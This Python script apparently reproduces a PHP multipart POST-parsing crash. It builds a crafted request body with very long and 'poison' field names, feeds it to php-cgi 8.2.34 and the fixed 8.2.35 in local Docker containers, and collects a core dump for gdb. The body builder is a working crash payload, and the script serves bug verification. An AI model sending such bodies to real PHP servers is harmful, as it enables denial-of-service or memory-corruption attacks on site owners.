#!/usr/bin/env python3
"""oom43: honest-contrast finisher (self-contained, no exec chains).
a) 8.2.35 fixed @ 64M with POSTCOUNT probe -> prove the identical attack
   body parses completely and safely (rc=0, count matches).
b) native core-dump attempt on phpbuild (8.2.34): ulimit -c unlimited,
   run kill shape, find core, gdb it -> native faulting instruction+address.
"""
import subprocess
import sys

NAMELEN = 3064


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n, poison):
    cell = bytes([8, 8, 8, 8, 8, 8, 8, 8, 8, 1, 8, 8, 8, 8, 8, 8])
    nm = b"q" + cell * ((poison - 10) // 16) + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build(k1=2044, prep=3, poison=163840):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n, poison) for n in range(prep)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


BODY = build()


def docker(cid, cmd, timeout=590, inp=None):
    r = subprocess.run(["docker", "exec", cid, "sh", "-c", cmd],
                       input=inp, capture_output=True, timeout=timeout)
    return r.returncode, r.stdout.decode("latin1")


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "both"

    if mode in ("fixed", "both"):
        print("=== [a] 8.2.35 fixed @ 64M, POSTCOUNT probe ===", flush=True)
        docker("phpbuild35", "printf '<?php echo \"POSTCOUNT=\".count($_POST);' > /tmp/t_probe.php")
        docker("phpbuild35", "cat > /tmp/body35.bin", inp=BODY, timeout=120)
        cmd = ("REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
               "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
               "/usr/src/php-8.2.35/sapi/cgi/php-cgi -d memory_limit=64000000 "
               "-d post_max_size=4096M -d max_input_vars=100000 "
               "</tmp/body35.bin >/tmp/o35.log 2>/tmp/e35.log; echo RC=$?") % len(BODY)
        rc, out = docker("phpbuild35", cmd)
        _, tail = docker("phpbuild35", "tail -3 /tmp/e35.log; echo ...; tail -4 /tmp/o35.log")
        print("rc:", rc, "| stdout:", out.strip())
        print(tail, flush=True)

    if mode in ("core", "both"):
        print("=== [b] native core-dump attempt (8.2.34 instrumented) ===", flush=True)
        _, pat = docker("phpbuild", "cat /proc/sys/kernel/core_pattern")
        print("core_pattern:", pat.strip())
        docker("phpbuild", "cat > /tmp/body.bin", inp=BODY, timeout=120)
        runcmd = ("REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
                  "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
                  "sh -c 'ulimit -c unlimited; ulimit -S; "
                  "/usr/src/php-8.2.34/sapi/cgi/php-cgi -d memory_limit=20600000 "
                  "-d post_max_size=4096M -d max_input_vars=100000 "
                  "</tmp/body.bin >/tmp/o.log 2>/tmp/e.log; echo RC=$?; "
                  "ls -la /tmp/core* /core* 2>/dev/null'") % len(BODY)
        rc, out = docker("phpbuild", runcmd)
        print(out)
        _, ls = docker("phpbuild", "ls -la /tmp/core* /core* 2>/dev/null; echo END")
        print(ls)
        if "core" in ls.replace("END", "").strip():
            print("--- gdb on core ---", flush=True)
            _, bt = docker("phpbuild", "gdb -q -batch "
                           "-ex 'bt 10' -ex 'info registers rip rdi rsi' -ex 'x/2i \\$pc' "
                           "/usr/src/php-8.2.34/sapi/cgi/php-cgi /tmp/core* 2>&1 | tail -30")
            print(bt)
